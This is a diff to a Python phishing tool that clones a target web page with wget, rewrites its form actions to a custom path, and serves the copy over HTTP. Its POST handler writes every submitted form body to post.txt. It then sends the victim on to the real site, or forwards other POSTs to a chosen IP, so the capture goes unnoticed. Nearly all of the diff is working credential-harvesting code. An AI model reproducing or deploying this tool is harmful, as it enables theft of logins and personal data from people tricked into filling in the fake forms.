@@ -32,8 +32,6 @@ PORT = 80
 os.system("clear")
 print(BANNER)
 
-# TODO : Add option to download webpage manually
-
 redirect_ip = input("[*] What is the IP you want to redirect to : ")
 
 yes = {'yes','y', 'ye'}
@@ -44,7 +42,7 @@ use_wget = input("[*] Do you want to automatically download the page with wget? 
 if use_wget.lower() not in no:
     url = input("[*] What is the FULL URL you want to copy : ")
 
-    user_agent_change = input("Change default user agent? (y/N) : ")
+    user_agent_change = input("[*] Change default user agent? (y/N) : ")
     
     if user_agent_change.lower() in yes:
         user_agent = input("User agent : ")
@@ -87,8 +85,8 @@ html_as_str = open(INDEX_PATH, 'r').read()
 
 # Yes, I do in fact parse HTML with Regex, I know.
 
-forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'     # Regex pattern
-html_as_str = re.sub(forms_pattern, r'\1\\\3', html_as_str) # Make sure that all <form> POST action is directed to us
+forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'                                         # Regex pattern
+html_as_str = re.sub(forms_pattern, r'\1\\custom_path_for_form_post_requests\3', html_as_str)   # Make sure that all <form> POST action is directed to a special path
 
 with open(INDEX_PATH, 'wb') as file:
     file.write(str.encode(html_as_str))
@@ -105,7 +103,7 @@ input("[*] Press ENTER to start the HTTP server ...")
 # Custom SimpleHTTPRequestHandler where we edit the GET and POST actions and log messages
 class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        print("[*] GET request received!")
+        print("[*] GET request received!")                                      # Print that we received a request
 
         if os.path.exists(self.translate_path(self.path)):                      # Check if we have the requested file
             f = self.send_head()                                                # Send headers
@@ -121,25 +119,35 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers() 
 
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])            # Get length of POST body
-        body = self.rfile.read(content_length)                          # Read entire POST body
-        self.send_response(303)                                         # Send HTTP 303 "see other" redirect response, more info: https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
-        self.send_header("Location", "http://{}".format(redirect_ip))   # Set the Location value in the HTTP response header to our redirect IP
-        self.end_headers()                                              # End the HTTP header
-        print("[*] POST request received!")                             # Print that we received a request
-        with open(POST_PATH, 'a+') as file:                             # Open post.txt in append mode to add the entire POST request
-            file.write(body.decode("utf-8"))
-            file.write("\n\n")
-        self.wfile.write(str.encode(""))
+        print("[*] POST request received!")                                             # Print that we received a request
+
+        content_length = int(self.headers['Content-Length'])                            # Get length of POST body
+        body = self.rfile.read(content_length)                                          # Read entire POST body
+        
+        if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
+            print("[*] Form was filled! Writing output to post.txt ...")
+            self.send_response(303)                                                     # Send HTTP 303 ("see other") which will make the browser perform a GET on the "Location" header
+            self.send_header("Location", url)                                           # Set "Location" header to our initial URL
+            with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
+                file.write(body.decode("utf-8"))
+                file.write("\n\n")
+        else:
+            self.send_response(307)                                                     # Send HTTP 307 redirect response, which will make the browser resend the exact same POST request
+            self.send_header("Location", "http://{}{}".format(redirect_ip,self.path))   # Set the Location value in the HTTP response header to our redirect IP with the path to send the POST request
+        
+        self.end_headers()                                                              # End the HTTP header
 
     def log_message(self, format, *args):
         return
 
+# Change directory to /web and launch the HTTP server there
 os.chdir(WEB_PATH)
 print("\n[*] Launching HTTP server ...")
 httpd = socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler)
 print("[*] Serving at port {}.".format(PORT))
 print("[*] Use CTRL+C to exit and close the HTTP server.")
+
+# Launch and run HTTP server as long CTRL+C isn't pressed
 try:
     httpd.serve_forever()
 except KeyboardInterrupt as error:
